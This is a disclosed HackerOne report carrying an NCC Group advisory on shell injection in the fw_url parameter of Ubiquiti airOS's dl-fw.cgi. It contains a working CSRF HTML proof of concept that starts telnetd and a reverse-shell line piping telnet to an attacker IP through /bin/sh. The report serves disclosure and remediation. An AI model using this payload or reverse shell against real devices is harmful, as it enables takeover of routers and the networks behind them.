# Shell Injection via Web Management Console (dl-fw.cgi)

## Report Details
- **Report ID**: 121940
- **URL**: https://hackerone.com/reports/121940
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-03-10T04:01:09.590Z
- **Disclosed**: 2016-10-15T22:40:55.393Z

## Reporter
- **Username**: mornaner
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ui

## Vulnerability Information
NCC Group Security Advisory
https://www.nccgroup.trust
--------------------------------------------

Shell Injection via Web Management Console

Vendor: Ubiquiti Networks
Vendor URL: https://www.ubnt.com
Versions affected: airOS XM board line (potentially all airOS lines, unverified)
Systems Affected: AG-HP-2G16, AG-HP-2G20, AG-HP-5G23, AG-HP-5G27, AirGrid M,
AirGrid M2, AirGrid M5, AR, AR-HP, BM2HP, BM2-Ti, BM5HP, BM5-Ti, LiteStation M5,
locoM2, locoM5, locoM9, M2, M3, M365, M5, M900, NB-2G18, NB-5G22, NB-5G25, NBM3,
NBM365, NBM9, NSM2, NSM3, NSM365, NSM5, PBM10, PBM3, PBM365, PBM5, PICOM2HP,
Power AP N (Verified on AR-HP running firmware v5.6.3)
Author: Joel St. John <joel.stjohn[at]nccgroup[dot]trust>
Risk: High

Summary:
--------
The dl-fw.cgi script does not properly sanitize URLs passed via the fw_url parameter, allowing
arbitrary shell commands to be provided as part of the input.

Location: 
---------
/usr/www/dl-fw.cgi

Impact:
-------
This issue can be used to execute arbitrary shell commands on the device.
 
Details:
--------
The airOS XM, XW, and TI lines (and potentially others) all contain a utility script
called dl-fw.cgi that is hosted in the webroot. This script is used in conjunction
with other functionality to download/display EULAs and download firmware updates.

This script can be called directly via POSTs, since it is within the webroot. On Line 62-63,
the script executes the following using a specified fw_url parameter:

62: $cmd = "$cmd_wget -O $firmware_file --header='Referer: $eula_url ' $fw_url > $progress_file 2>&1";
63: exec($cmd, $lines, $res);

No sanitization is performed on fw_url, which allows an attacker to specify arbitrary shell commands
which are in turn passed to exec. For instance, the following example uses the URL
http://www.nccgroup.trust/testtest123/`telnetd`, along with a cross-site request forgery attack
to start the telnet service:

<html>
  <body>
    <form action="https://192.168.1.1/dl-fw.cgi" method="POST">
      <input type="hidden" name="action" value="download" />
      <input type="hidden" name="fw&#95;url" value="http&#58;&#47;&#47;www&#46;nccgroup&#46;trust&#47;testtest123&#47;&#96;telnetd&#96;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

This can also be used to open a reverse shell via telnet, for instance by injecting:

telnet <attacker ip> <port1> | /bin/sh | telnet <attacker ip> port2

Recommendation:
----------------
Sanitize the fw_url parameter to remove/encode shell metacharacters using EscapeShellCmd
(as done elsewhere) or similar methods.

About NCC Group:
--------------------
NCC Group is a global expert in cyber security and risk mitigation, working with businesses to protect their brand, value and reputation against the ever-evolving threat landscape. Our Security Consulting services leverage our extensive knowledge of current security vulnerabilities, penetration testing techniques and software development best practices to enable organizations to secure their applications against ever-present threats. At NCC Group we can boast unrivaled talent and recognized world-class security expertise. Bringing together best in class security consultancies iSEC Partners, Intrepidus Group, Matasano, NCC Group and NGS we have created one of the largest, most respected security consultancies in the world.

## Attachments
No attachments
